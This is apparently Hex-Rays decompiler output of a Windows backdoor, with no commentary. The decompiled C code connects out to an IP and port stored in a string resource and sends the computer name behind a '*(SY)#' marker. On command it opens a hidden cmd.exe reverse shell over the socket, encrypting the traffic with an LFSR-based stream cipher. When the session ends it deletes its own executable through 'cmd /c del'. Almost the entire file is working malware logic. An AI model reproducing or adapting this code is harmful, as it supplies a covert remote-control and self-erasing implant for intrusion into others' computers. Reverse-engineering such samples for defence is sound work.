/* This file was generated by the Hex-Rays decompiler version 7.7.0.220118.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

int __cdecl sub_401000(int a1, unsigned int a2);
int __cdecl sub_401040(int a1, unsigned int a2);
int __cdecl sub_401080(int a1, unsigned int a2);
int __cdecl sub_4010C0(int *a1, char *a2);
int __cdecl sub_401130(unsigned int *a1);
BOOL __cdecl sub_401190(char a1, __int16 a2, __int16 a3);
void __cdecl sub_4011E0(unsigned int *a1, int a2, int a3);
void __cdecl sub_401220(unsigned int *a1, int a2, int a3);
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd);
int __cdecl sub_401270(SOCKET s, char *buf, int len); // idb
BOOL sub_4012C0();
char *sub_401320();
void *sub_401600();
void __cdecl StartAddress(void *); // idb
HANDLE __cdecl sub_401860(void *a1, HANDLE hSourceHandle);
void __stdcall __noreturn sub_401940(const void *lpThreadParameter);
void __stdcall __noreturn sub_401A70(const void *lpThreadParameter);
int sub_401B50();
// uintptr_t __cdecl beginthread(_beginthread_proc_type StartAddress, unsigned int StackSize, void *ArgList);
// int __cdecl strnicmp(const char *String1, const char *String2, size_t MaxCount);
// int sprintf(char *const Buffer, const char *const Format, ...);
// int __cdecl atol(const char *String);
// char *__cdecl strchr(const char *Str, int Val);
// void __cdecl free(void *Block);
// void *__cdecl malloc(size_t Size);
int __cdecl UserMathErrorFunction();
// int __stdcall send(SOCKET s, const char *buf, int len, int flags);
// int __stdcall recv(SOCKET s, char *buf, int len, int flags);
// int __stdcall connect(SOCKET s, const struct sockaddr *name, int namelen);
// unsigned int __stdcall inet_addr(const char *cp);
// u_short __stdcall htons(u_short hostshort);
// int __stdcall closesocket(SOCKET s);
// SOCKET __stdcall socket(int af, int type, int protocol);
// int __stdcall WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData);
// char *__cdecl itoa(int Value, char *Buffer, int Radix);

//-------------------------------------------------------------------------
// Data declarations

// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern HANDLE (__stdcall *CreateEventA)(LPSECURITY_ATTRIBUTES lpEventAttributes, BOOL bManualReset, BOOL bInitialState, LPCSTR lpName);
// extern void (__stdcall __noreturn *ExitThread)(DWORD dwExitCode);
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern BOOL (__stdcall *GetComputerNameA)(LPSTR lpBuffer, LPDWORD nSize);
// extern BOOL (__stdcall *CreatePipe)(PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize);
// extern BOOL (__stdcall *DisconnectNamedPipe)(HANDLE hNamedPipe);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern DWORD (__stdcall *WaitForMultipleObjects)(DWORD nCount, const HANDLE *lpHandles, BOOL bWaitAll, DWORD dwMilliseconds);
// extern BOOL (__stdcall *TerminateThread)(HANDLE hThread, DWORD dwExitCode);
// extern HANDLE (__stdcall *CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
// extern BOOL (__stdcall *CreateProcessA)(LPCSTR lpApplicationName, LPSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCSTR lpCurrentDirectory, LPSTARTUPINFOA lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation);
// extern BOOL (__stdcall *DuplicateHandle)(HANDLE hSourceProcessHandle, HANDLE hSourceHandle, HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwOptions);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern BOOL (__stdcall *ReadFile)(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *PeekNamedPipe)(HANDLE hNamedPipe, LPVOID lpBuffer, DWORD nBufferSize, LPDWORD lpBytesRead, LPDWORD lpTotalBytesAvail, LPDWORD lpBytesLeftThisMessage);
// extern BOOL (__stdcall *SetEvent)(HANDLE hEvent);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern BOOL (__stdcall *SetProcessPriorityBoost)(HANDLE hProcess, BOOL bDisablePriorityBoost);
// extern BOOL (__stdcall *SetThreadPriority)(HANDLE hThread, int nPriority);
// extern HANDLE (__stdcall *GetCurrentThread)();
// extern BOOL (__stdcall *SetPriorityClass)(HANDLE hProcess, DWORD dwPriorityClass);
// extern LPSTR (__stdcall *lstrcatA)(LPSTR lpString1, LPCSTR lpString2);
// extern LPSTR (__stdcall *lstrcpyA)(LPSTR lpString1, LPCSTR lpString2);
// extern DWORD (__stdcall *GetEnvironmentVariableA)(LPCSTR lpName, LPSTR lpBuffer, DWORD nSize);
// extern DWORD (__stdcall *GetShortPathNameA)(LPCSTR lpszLongPath, LPSTR lpszShortPath, DWORD cchBuffer);
// extern DWORD (__stdcall *GetModuleFileNameA)(HMODULE hModule, LPSTR lpFilename, DWORD nSize);
// extern BOOL (__stdcall *ShellExecuteExA)(SHELLEXECUTEINFOA *pExecInfo);
// extern void (__stdcall *SHChangeNotify)(LONG wEventId, UINT uFlags, LPCVOID dwItem1, LPCVOID dwItem2);
// extern int (__stdcall *LoadStringA)(HINSTANCE hInstance, UINT uID, LPSTR lpBuffer, int cchBufferMax);
char byte_403014[8] = { '\x11', ':', 'm', '\xD2', '\'', '\xE9', '\xB9', '1' }; // weak
char aSyCmd[] = "*(SY)# cmd"; // idb
char String2[] = "*(SY)#"; // idb
char aSy[8] = "*(SY)# "; // weak
char aCmdExe[8] = "cmd.exe"; // weak
char aExit[] = "exit\r\n"; // idb
char aOpen[5] = "Open"; // weak
CHAR aNul[] = " > nul"; // idb
CHAR aCDel[] = "/c del "; // idb
CHAR Name[] = "COMSPEC"; // idb
CHAR Str = '\0'; // idb
char byte_4030A1[51] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
HANDLE hEvent = NULL; // idb
HANDLE hObject = NULL; // idb
_UNKNOWN unk_4030E0; // weak


//----- (00401000) --------------------------------------------------------
int __cdecl sub_401000(int a1, unsigned int a2)
{
  int result; // eax

  result = a2;
  if ( a1 != ((a2 >> 9) & 1) )
  {
    result = 2 * (a2 & 0x3FFFF);
    if ( ((a2 ^ ((a2 ^ ((a2 ^ (a2 >> 1)) >> 1)) >> 3)) & 0x2000) != 0 )
      return result ^ 1;
  }
  return result;
}

//----- (00401040) --------------------------------------------------------
int __cdecl sub_401040(int a1, unsigned int a2)
{
  int result; // eax

  result = a2;
  if ( a1 != ((a2 >> 11) & 1) )
  {
    result = 2 * (a2 & 0x1FFFFF);
    if ( ((a2 ^ ((a2 ^ ((a2 ^ (a2 >> 1)) >> 4)) >> 4)) & 0x1000) != 0 )
      return result ^ 1;
  }
  return result;
}

//----- (00401080) --------------------------------------------------------
int __cdecl sub_401080(int a1, unsigned int a2)
{
  int result; // eax

  result = a2;
  if ( a1 != ((a2 >> 11) & 1) )
  {
    result = 2 * (a2 & 0x3FFFFF);
    if ( ((a2 ^ ((a2 ^ ((a2 ^ (a2 >> 1)) >> 3)) >> 1)) & 0x20000) != 0 )
      return result ^ 1;
  }
  return result;
}

//----- (004010C0) --------------------------------------------------------
int __cdecl sub_4010C0(int *a1, char *a2)
{
  int result; // eax

  *a1 = (a2[2] >> 5) | (8 * (a2[1] | (*a2 << 8)));
  a1[1] = (a2[5] >> 7) | (2 * (a2[4] | ((a2[3] | (a2[2] << 6)) << 8)));
  result = a2[7];
  a1[2] = result | ((a2[6] | (a2[5] << 9)) << 8);
  return result;
}

//----- (00401130) --------------------------------------------------------
int __cdecl sub_401130(unsigned int *a1)
{
  int v1; // edi
  int v2; // eax
  unsigned int v3; // ecx
  int v4; // eax
  unsigned int v5; // edx
  int v6; // ecx
  unsigned __int8 v7; // al

  v1 = sub_401190(*a1, a1[1], a1[2]);
  v2 = sub_401000(v1, *a1);
  v3 = a1[1];
  *a1 = v2;
  v4 = sub_401040(v1, v3);
  v5 = a1[2];
  a1[1] = v4;
  v6 = sub_401080(v1, v5);
  v7 = *a1 ^ a1[1];
  a1[2] = v6;
  return ((unsigned __int8)v6 ^ v7) & 1;
}

//----- (00401190) --------------------------------------------------------
BOOL __cdecl sub_401190(char a1, __int16 a2, __int16 a3)
{
  return ((a3 & 0x800) == 2048) + ((a2 & 0x800) == 2048) + ((a1 & 0x80) == 0x80) <= 1;
}

//----- (004011E0) --------------------------------------------------------
void __cdecl sub_4011E0(unsigned int *a1, int a2, int a3)
{
  int v3; // esi
  char i; // bl

  v3 = 0;
  for ( i = 1; v3 < a3; ++v3 )
  {
    i = sub_401130(a1) | (2 * i);
    *(_BYTE *)(v3 + a2) ^= i;
  }
}

//----- (00401220) --------------------------------------------------------
void __cdecl sub_401220(unsigned int *a1, int a2, int a3)
{
  sub_4011E0(a1, a2, a3);
}

//----- (00401240) --------------------------------------------------------
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
  LoadStringA(hInstance, 1u, &Str, 255);
  sub_4012C0(&Str);
  return 0;
}
// 4012C0: using guessed type _DWORD __cdecl sub_4012C0(_DWORD);

//----- (00401270) --------------------------------------------------------
int __cdecl sub_401270(SOCKET s, char *buf, int len)
{
  int v3; // esi
  int v5; // eax

  v3 = len;
  if ( len <= 0 )
    return len;
  while ( 1 )
  {
    v5 = send(s, buf, v3, 0);
    if ( v5 < 0 )
      return -1;
    if ( !v5 )
      break;
    v3 -= v5;
    buf += v5;
    if ( v3 <= 0 )
      return len;
  }
  return len - v3;
}

//----- (004012C0) --------------------------------------------------------
BOOL sub_4012C0()
{
  hObject = CreateEventA(0, 1, 0, 0);
  hEvent = CreateEventA(0, 1, 0, 0);
  memset(&unk_4030E0, 0, 0x12Cu);
  sub_401320();
  WaitForSingleObject(hObject, 0);
  return CloseHandle(hObject);
}

//----- (00401320) --------------------------------------------------------
char *sub_401320()
{
  char *result; // eax
  signed int v1; // edx
  signed int v2; // eax
  signed int i; // esi
  void *v4; // ebp
  u_short v5; // ax
  int v6; // esi
  int v7; // eax
  DWORD nSize; // [esp+10h] [ebp-3DCh] BYREF
  struct sockaddr name; // [esp+14h] [ebp-3D8h] BYREF
  char v10[12]; // [esp+24h] [ebp-3C8h] BYREF
  char String[20]; // [esp+30h] [ebp-3BCh] BYREF
  char cp[20]; // [esp+44h] [ebp-3A8h] BYREF
  char buf[252]; // [esp+58h] [ebp-394h] BYREF
  __int16 v14; // [esp+154h] [ebp-298h]
  char v15; // [esp+156h] [ebp-296h]
  CHAR Buffer[260]; // [esp+158h] [ebp-294h] BYREF
  struct WSAData WSAData; // [esp+25Ch] [ebp-190h] BYREF

  result = strchr(&Str, 58);
  v1 = result - &Str;
  if ( result - &Str > 0 )
  {
    v2 = 0;
    if ( v1 > 0 )
    {
      v2 = v1;
      qmemcpy(cp, &Str, v1);
    }
    cp[v2] = 0;
    for ( i = 0; i < (int)(strlen(&Str) - v1); ++i )
      String[i] = byte_4030A1[v1 + i];
    memset(Buffer, 0, sizeof(Buffer));
    String[i] = 0;
    nSize = 260;
    GetComputerNameA(Buffer, &nSize);
    Buffer[strlen(Buffer)] = 0;
    WSAStartup(0x101u, &WSAData);
    v4 = (void *)socket(2, 1, 0);
    if ( v4 == (void *)-1 )
    {
      closesocket(0xFFFFFFFF);
      Sleep(0x927C0u);
    }
    else
    {
      name.sa_family = 2;
      v5 = atol(String);
      *(_WORD *)name.sa_data = htons(v5);
      *(_DWORD *)&name.sa_data[2] = inet_addr(cp);
      if ( connect((SOCKET)v4, &name, 16) == -1 )
      {
        closesocket((SOCKET)v4);
        Sleep(0x3E8u);
      }
      else
      {
        memset(buf, 0, sizeof(buf));
        v14 = 0;
        v15 = 0;
        strcpy(buf, aSy);
        strcat(buf, Buffer);
        buf[strlen(buf)] = 0;
        v6 = send((SOCKET)v4, buf, strlen(buf), 0);
        sprintf(v10, "send = %d", strlen(buf));
        sprintf(v10, "send = %d", v6);
        if ( v6 != -1 )
        {
          memset(buf, 0, sizeof(buf));
          v14 = 0;
          v15 = 0;
          v7 = recv((SOCKET)v4, buf, 255, 0);
          if ( v7 != -1 )
          {
            while ( v7 > 0 )
            {
              if ( strnicmp(buf, String2, 6u) )
                goto LABEL_20;
              if ( !strnicmp(buf, aSyCmd, 0xAu) )
              {
                beginthread(StartAddress, 0, v4);
LABEL_20:
                ExitThread(0);
              }
              memset(buf, 0, sizeof(buf));
              v14 = 0;
              v15 = 0;
              v7 = recv((SOCKET)v4, buf, 255, 0);
              if ( v7 == -1 )
                return (char *)sub_401B50();
            }
          }
        }
      }
    }
    return (char *)sub_401B50();
  }
  return result;
}
// 401320: using guessed type char cp[20];
// 401320: using guessed type char String[20];
// 401320: using guessed type CHAR Buffer[260];
// 401320: using guessed type char buf[252];

//----- (00401600) --------------------------------------------------------
void *sub_401600()
{
  void *v0; // esi
  void *v1; // edi
  HANDLE hReadPipe; // [esp+Ch] [ebp-14h] BYREF
  HANDLE hWritePipe; // [esp+10h] [ebp-10h] BYREF
  struct _SECURITY_ATTRIBUTES PipeAttributes; // [esp+14h] [ebp-Ch] BYREF

  hReadPipe = 0;
  hWritePipe = 0;
  v0 = malloc(0x18u);
  *(_DWORD *)v0 = 0;
  *((_DWORD *)v0 + 1) = 0;
  PipeAttributes.nLength = 12;
  PipeAttributes.lpSecurityDescriptor = 0;
  PipeAttributes.bInheritHandle = 1;
  if ( CreatePipe((PHANDLE)v0, &hWritePipe, &PipeAttributes, 0)
    && CreatePipe(&hReadPipe, (PHANDLE)v0 + 1, &PipeAttributes, 0) )
  {
    *((_DWORD *)v0 + 2) = sub_401860(hReadPipe, hWritePipe);
    CloseHandle(hReadPipe);
    CloseHandle(hWritePipe);
    return v0;
  }
  else
  {
    if ( *(_DWORD *)v0 )
      CloseHandle(*(HANDLE *)v0);
    if ( hWritePipe )
      CloseHandle(hWritePipe);
    v1 = (void *)*((_DWORD *)v0 + 1);
    if ( v1 )
      CloseHandle(v1);
    if ( hReadPipe )
      CloseHandle(hReadPipe);
    free(v0);
    return 0;
  }
}

//----- (004016F0) --------------------------------------------------------
void __cdecl StartAddress(void *a1)
{
  HANDLE *v1; // esi
  HANDLE v2; // eax
  HANDLE v3; // eax
  DWORD v4; // eax
  DWORD v5; // eax
  DWORD ThreadId; // [esp+8h] [ebp-1Ch] BYREF
  struct _SECURITY_ATTRIBUTES ThreadAttributes; // [esp+Ch] [ebp-18h] BYREF
  HANDLE Handles[3]; // [esp+18h] [ebp-Ch] BYREF

  malloc(0x18u);
  v1 = (HANDLE *)sub_401600();
  ThreadAttributes.nLength = 12;
  ThreadAttributes.lpSecurityDescriptor = 0;
  ThreadAttributes.bInheritHandle = 0;
  v1[3] = a1;
  v2 = CreateThread(&ThreadAttributes, 0, (LPTHREAD_START_ROUTINE)sub_401940, v1, 0, &ThreadId);
  v1[4] = v2;
  if ( v2 )
  {
    v3 = CreateThread(&ThreadAttributes, 0, (LPTHREAD_START_ROUTINE)sub_401A70, v1, 0, &ThreadId);
    v1[5] = v3;
    if ( v3 )
    {
      Handles[0] = v1[4];
      Handles[1] = v1[5];
      Handles[2] = v1[2];
      v4 = WaitForMultipleObjects(3u, Handles, 0, 0xFFFFFFFF);
      if ( v4 )
      {
        v5 = v4 - 1;
        if ( v5 )
        {
          if ( v5 == 1 )
          {
            TerminateThread(v1[5], 0);
            TerminateThread(v1[4], 0);
          }
        }
        else
        {
          TerminateThread(v1[4], 0);
          TerminateProcess(v1[2], 1u);
        }
      }
      else
      {
        TerminateThread(v1[5], 0);
        TerminateProcess(v1[2], 1u);
      }
      closesocket((SOCKET)v1[3]);
      DisconnectNamedPipe(*v1);
      CloseHandle(*v1);
      DisconnectNamedPipe(v1[1]);
      CloseHandle(v1[1]);
      CloseHandle(v1[4]);
      CloseHandle(v1[5]);
      CloseHandle(v1[2]);
      if ( v1 )
        free(v1);
      sub_401B50();
    }
    else
    {
      v1[3] = (HANDLE)-1;
      TerminateThread(0, 0);
    }
  }
  else
  {
    v1[3] = (HANDLE)-1;
  }
}

//----- (00401860) --------------------------------------------------------
HANDLE __cdecl sub_401860(void *a1, HANDLE hSourceHandle)
{
  HANDLE v2; // eax
  HANDLE hProcess; // esi
  HANDLE CurrentProcess; // [esp-14h] [ebp-80h]
  CHAR CommandLine[12]; // [esp+Ch] [ebp-60h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+18h] [ebp-54h] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+28h] [ebp-44h] BYREF

  StartupInfo.cb = 68;
  memset(&StartupInfo.lpReserved, 0, 28);
  StartupInfo.wShowWindow = 0;
  StartupInfo.lpReserved2 = 0;
  StartupInfo.cbReserved2 = 0;
  StartupInfo.dwFlags = 257;
  StartupInfo.hStdInput = a1;
  StartupInfo.hStdOutput = hSourceHandle;
  StartupInfo.hStdError = hSourceHandle;
  CurrentProcess = GetCurrentProcess();
  v2 = GetCurrentProcess();
  DuplicateHandle(v2, hSourceHandle, CurrentProcess, &StartupInfo.hStdError, 2u, 1, 0);
  strcpy(CommandLine, aCmdExe);
  if ( !CreateProcessA(0, CommandLine, 0, 0, 1, 0, 0, 0, &StartupInfo, &ProcessInformation) )
    return 0;
  hProcess = ProcessInformation.hProcess;
  CloseHandle(ProcessInformation.hThread);
  return hProcess;
}

//----- (00401940) --------------------------------------------------------
void __stdcall __noreturn sub_401940(const void *lpThreadParameter)
{
  SOCKET *v1; // ebp
  DWORD v2; // eax
  char *v3; // eax
  DWORD BytesRead; // [esp+Ch] [ebp-414h] BYREF
  char v5[4]; // [esp+10h] [ebp-410h] BYREF
  unsigned int v6[3]; // [esp+14h] [ebp-40Ch] BYREF
  char Buffer[1024]; // [esp+20h] [ebp-400h] BYREF

  v1 = (SOCKET *)malloc(0x18u);
  qmemcpy(v1, lpThreadParameter, 0x18u);
  while ( PeekNamedPipe((HANDLE)*v1, Buffer, 0x400u, &BytesRead, 0, 0) )
  {
    if ( BytesRead )
    {
      ReadFile((HANDLE)*v1, Buffer, 0x400u, &BytesRead, 0);
      v2 = BytesRead;
      Buffer[BytesRead] = 0;
      BytesRead = v2 + 1;
      sub_4010C0((int *)v6, byte_403014);
      sub_4011E0(v6, (int)Buffer, BytesRead);
      v3 = itoa(BytesRead, v5, 10);
      if ( send(v1[3], v3, 4, 0) <= 0 || sub_401270(v1[3], Buffer, BytesRead) <= 0 )
        break;
    }
    else
    {
      Sleep(0x32u);
    }
  }
  free(v1);
  ExitThread(0);
}
// 401940: using guessed type char Buffer[1024];
// 401940: using guessed type unsigned int var_40C[3];
// 401940: using guessed type char var_410[4];

//----- (00401A70) --------------------------------------------------------
void __stdcall __noreturn sub_401A70(const void *lpThreadParameter)
{
  void *v1; // ebx
  int i; // esi
  DWORD NumberOfBytesWritten; // [esp+Ch] [ebp-410h] BYREF
  unsigned int v4[3]; // [esp+10h] [ebp-40Ch] BYREF
  char buf[1024]; // [esp+1Ch] [ebp-400h] BYREF

  v1 = malloc(0x18u);
  qmemcpy(v1, lpThreadParameter, 0x18u);
  for ( i = recv(*((_DWORD *)v1 + 3), buf, 1024, 0); i != -1; i = recv(*((_DWORD *)v1 + 3), buf, 1024, 0) )
  {
    sub_4010C0((int *)v4, byte_403014);
    sub_401220(v4, (int)buf, i);
    if ( !strnicmp(buf, aExit, 6u) )
    {
      SetEvent(hEvent);
      free(v1);
      ExitThread(0);
    }
    if ( !WriteFile(*((HANDLE *)v1 + 1), buf, i, &NumberOfBytesWritten, 0) )
      break;
  }
  free(v1);
  ExitThread(0);
}
// 401A70: using guessed type unsigned int var_40C[3];

//----- (00401B50) --------------------------------------------------------
int sub_401B50()
{
  HANDLE CurrentProcess; // eax
  HANDLE CurrentThread; // eax
  HANDLE v3; // eax
  HANDLE v4; // eax
  SHELLEXECUTEINFOA pExecInfo; // [esp+10h] [ebp-348h] BYREF
  CHAR Filename[260]; // [esp+4Ch] [ebp-30Ch] BYREF
  CHAR String1[260]; // [esp+150h] [ebp-208h] BYREF
  CHAR Buffer[260]; // [esp+254h] [ebp-104h] BYREF

  if ( GetModuleFileNameA(0, Filename, 0x104u)
    && GetShortPathNameA(Filename, Filename, 0x104u)
    && GetEnvironmentVariableA(Name, Buffer, 0x104u) )
  {
    lstrcpyA(String1, aCDel);
    lstrcatA(String1, Filename);
    lstrcatA(String1, aNul);
    pExecInfo.hwnd = 0;
    pExecInfo.lpDirectory = 0;
    pExecInfo.nShow = 0;
    pExecInfo.cbSize = 60;
    pExecInfo.lpVerb = aOpen;
    pExecInfo.lpFile = Buffer;
    pExecInfo.lpParameters = String1;
    pExecInfo.fMask = 64;
    CurrentProcess = GetCurrentProcess();
    SetPriorityClass(CurrentProcess, 0x100u);
    CurrentThread = GetCurrentThread();
    SetThreadPriority(CurrentThread, 15);
    if ( ShellExecuteExA(&pExecInfo) )
    {
      SetPriorityClass(pExecInfo.hProcess, 0x40u);
      SetProcessPriorityBoost(pExecInfo.hProcess, 1);
      SHChangeNotify(4, 1u, Filename, 0);
      return 1;
    }
    v3 = GetCurrentProcess();
    SetPriorityClass(v3, 0x20u);
    v4 = GetCurrentThread();
    SetThreadPriority(v4, 0);
  }
  return 0;
}

//----- (00401E56) --------------------------------------------------------
int __cdecl UserMathErrorFunction()
{
  return 0;
}

// nfuncs=42 queued=19 decompiled=19 lumina nreq=0 worse=0 better=0
// ALL OK, 19 function(s) have been successfully decompiled
